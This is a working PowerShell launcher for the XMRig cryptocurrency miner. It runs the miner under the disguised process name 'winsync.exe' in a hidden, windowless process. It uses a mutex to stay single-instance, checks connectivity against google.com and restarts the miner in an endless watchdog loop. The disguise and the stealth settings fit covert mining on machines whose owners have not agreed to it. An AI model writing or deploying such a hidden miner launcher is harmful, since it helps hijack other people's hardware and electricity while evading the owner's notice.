# XMRig Silent Wrapper v5.1
# Launched automatically by xmrig_setup_v5.bat
# Do not run this directly

$exePath    = "C:\Program Files\XMRig\winsync.exe"
$mutexName  = "Global\XMRigMinerMutex"
$lockFile   = "C:\ProgramData\XMRig\miner.lock"
$lockDir    = "C:\ProgramData\XMRig"

# ---- Bulletproof single instance via Windows named mutex ----
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
$acquired = $false
try {
    $acquired = $mutex.WaitOne(0, $false)
} catch [System.Threading.AbandonedMutexException] {
    $acquired = $true
}

if (-not $acquired) { exit 0 }

try {
    if (-not (Test-Path $lockDir)) { New-Item -Path $lockDir -ItemType Directory -Force | Out-Null }
    New-Item -Path $lockFile -ItemType File -Force | Out-Null

    if (-not (Test-Path $exePath)) { exit 0 }

    # Network check on start
    $online = $false
    for ($i = 0; $i -lt 10; $i++) {
        try {
            Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
            $online = $true
            break
        } catch { Start-Sleep -Seconds 6 }
    }
    if (-not $online) { exit 0 }

    # Kill any existing instance
    Stop-Process -Name "winsync" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    # Launch hidden
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName        = $exePath
    $pinfo.Arguments       = "--config=`"C:\Program Files\XMRig\config.json`" --no-color"
    $pinfo.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $pinfo.CreateNoWindow  = $true
    $pinfo.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($pinfo) | Out-Null

    # Monitor loop
    while ($true) {
        Start-Sleep -Seconds 30

        $online = $false
        try {
            Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
            $online = $true
        } catch {}

        if (-not $online) {
            Stop-Process -Name "winsync" -Force -ErrorAction SilentlyContinue
            while (-not $online) {
                Start-Sleep -Seconds 15
                try {
                    Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
                    $online = $true
                } catch {}
            }
            [System.Diagnostics.Process]::Start($pinfo) | Out-Null
        }

        $running = Get-Process -Name "winsync" -ErrorAction SilentlyContinue
        if (-not $running) {
            Start-Sleep -Seconds 5
            [System.Diagnostics.Process]::Start($pinfo) | Out-Null
        }
    }

} finally {
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    if ($acquired) { $mutex.ReleaseMutex() }
    $mutex.Dispose()
}
